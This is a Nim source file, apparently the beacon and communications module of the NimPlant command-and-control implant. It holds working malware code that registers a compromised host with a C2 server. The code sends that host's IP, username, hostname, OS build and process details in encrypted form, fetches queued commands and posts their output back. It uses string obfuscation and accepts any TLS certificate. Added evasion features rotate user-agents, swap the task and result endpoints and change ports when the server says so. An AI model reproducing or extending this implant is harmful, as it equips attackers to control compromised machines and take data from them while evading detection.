import base64, json, puppy
from strutils import split, toLowerAscii, replace, parseBool
from unicode import toLower
from os import parseCmdLine
import crypto
import strenc
import random 


# Define the object with listener properties
type
    Listener* = object
        id* : string
        initialized* : bool
        registered* : bool
        listenerType* : string
        listenerHost* : string
        listenerIp* : string
        listenerPort* : string
        newListenerPort* : string
        registerPath* : string
        sleepTime* : int
        sleepJitter* : float
        killDate* : string
        taskPath* : string
        resultPath* : string
        userAgent* : string
        cryptKey* : string
        randomUserAgents: bool
        randomUserAgentsCounter: int
        changeEndPoints: bool


proc changeEndPointsStrategy(li :var Listener): void = 
    li.taskPath = "/zero"
    li.resultPath = "/zone"

# define a function to pick random userAgents with each command
proc getRandomUserAgent(li :var Listener): string =
    # check if our counter is equal 50, if so we return a NEW random userAgent, otherwise we just return the current one
    if li.randomUserAgentsCounter == 50 or li.userAgent == "NimPlant C2 Client":
        let userAgents: seq[string] = @[
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "iPhone/15.0 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Android/11 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",
            "Linux/x86_64 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "SamsungBrowser/15.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Mobile Safari/537.36",
            ]

        # we need to call this, in order to get a random number each time
        randomize()  
        let randomIndex = rand(userAgents.high)
        let randomUserAgent = userAgents[randomIndex]
        li.randomUserAgentsCounter = 0 
        li.userAgent = userAgents[randomIndex]

    return li.userAgent

# HTTP request function
proc doRequest(li : var Listener, path : string, postKey : string = "", postValue : string = "") : Response =
    try:
        # check Endpoints /results, tasks
        if li.changeEndPoints:
            changeEndPointsStrategy(li)
        else:
            li.taskPath = "/task"
            li.resultPath = "/result"

        # increase the requests counter
        li.randomUserAgentsCounter += 1 

        # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
        var target : string = toLowerAscii(li.listenerType) & "://"
        if li.listenerHost != "":
            target = target & li.listenerHost
        else:
            if li.newListenerPort != "":
                target = target & li.listenerIp & ":" & li.newListenerPort
            else:
                target = target & li.listenerIp & ":" & li.listenerPort
        target = target & path

        # GET request
        if (postKey == "" or postValue == ""):
            var headers: seq[Header]

            # Only send ID header once listener is registered
            if li.id != "":
                if li.randomUserAgents:
                    headers = @[
                            Header(key: "X-Identifier", value: li.id),
                            Header(key: "User-Agent", value: getRandomUserAgent(li))
                        ]
                else:
                    headers = @[
                        Header(key: "X-Identifier", value: li.id),
                        Header(key: "User-Agent", value: li.userAgent),
                    ] 

            else:
                if li.randomUserAgents:
                    headers = @[
                            Header(key: "User-Agent", value: getRandomUserAgent(li))
                        ]
                else:
                    headers = @[
                            Header(key: "User-Agent", value: li.userAgent)
                        ]

            let req = Request(
                url: parseUrl(target),
                verb: "get",
                headers: headers,
                allowAnyHttpsCertificate: true,
                )

            return fetch(req)

        # POST request
        else:
            if li.randomUserAgents:
                let req = Request(
                url: parseUrl(target),
                verb: "post",
                headers: @[
                    Header(key: "X-Identifier", value: li.id),
                    Header(key: "User-Agent", value: getRandomUserAgent(li)),
                    Header(key: "Content-Type", value: "application/json")
                    ],
                allowAnyHttpsCertificate: true,
                body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                )
                return fetch(req)



            else:
                let req = Request(
                    url: parseUrl(target),
                    verb: "post",
                    headers: @[
                        Header(key: "X-Identifier", value: li.id),
                        Header(key: "User-Agent", value: li.userAgent),
                        Header(key: "Content-Type", value: "application/json")
                        ],
                    allowAnyHttpsCertificate: true,
                    body: "{\"" & postKey & "\":\"" & postValue & "\"}"
                    )
                return fetch(req)

    except:
        # Return a fictive error response to handle
        var errResponse = Response()
        errResponse.code = 500
        return errResponse

# Init NimPlant ID and cryptographic key via GET request to the registration path
# XOR-decrypt transmitted key with static value for initial exchange
proc init*(li: var Listener) : void =
    # Allow us to re-write the static XOR key used for pre-crypto operations
    const xor_key {.intdefine.}: int = 459457925

    var res = doRequest(li, li.registerPath)
    if res.code == 200:
        li.id = parseJson(res.body)["id"].getStr()
        li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
        li.initialized = true
        li.randomUserAgents = false
        li.randomUserAgentsCounter = 0
        li.changeEndPoints = false
        li.newListenerPort = li.listenerPort
    else:
        li.initialized = false

# Initial registration function, including key init
proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : void =
    # Once key is known, send a second request to register nimplant with initial info
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode
            }
        ]
    var dataStr = ($data)[1..^2]
    let res = doRequest(li, li.registerPath, "data", encryptData(dataStr, li.cryptKey))

    if (res.code != 200):
        # Error at this point means XOR key mismatch, abort
        li.registered = false
    else:
        li.registered = true

# Watch for queued commands via GET request to the task path
proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
    var 
        res = doRequest(li, li.taskPath)
        cmdGuid : string
        cmd : string
        args : seq[string]

    # A connection error occurred, likely team server has gone down or restart
    if res.code != 200:
        cmd = obf("NIMPLANT_CONNECTION_ERROR")

        when defined verbose:
            echo obf("DEBUG: Connection error, got status code: "), res.code

    # Otherwise, parse task and arguments (if any)
    else:
        try:
            # check for userAgent status
            li.randomUserAgents = parseBool(decryptData(parseJson(res.body)["s2"].getStr(), li.cryptKey).replace("\'", "\""))
            # adjust userAgent back in case this is false
            if not li.randomUserAgents:
                li.userAgent = "NimPlant C2 Client"
            li.newListenerPort = decryptData(parseJson(res.body)["p3"].getStr(), li.cryptKey)
            li.changeEndPoints = parseBool(decryptData(parseJson(res.body)["s4"].getStr(), li.cryptKey).replace("\'", "\""))

            # Attempt to parse task (parseJson() needs string literal... sigh)
            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\"")
            var parsedResponseData = parseJson(responseData)

            # Get the task and task GUID from the response
            var task = parsedResponseData["task"].getStr()
            cmdGuid = parsedResponseData["guid"].getStr()

            try: 
                # Arguments are included with the task
                cmd = task.split(' ', 1)[0].toLower()
                args = parseCmdLine(task.split(' ', 1)[1])
            except:
                # There are no arguments
                cmd = task.split(' ', 1)[0].toLower()
        except:
            # No task has been returned
            cmdGuid = ""
            cmd = ""

    result = (cmdGuid, cmd, args)

# Return command results via POST request to the result path
proc postCommandResults*(li : var Listener, cmdGuid : string, output : string) : void =
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    discard doRequest(li, li.resultPath, "data", encryptData(data, li.cryptKey))

# Announce that the kill timer has expired
proc killSelf*(li : var Listener) : void =
    if li.initialized:
        postCommandResults(li, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))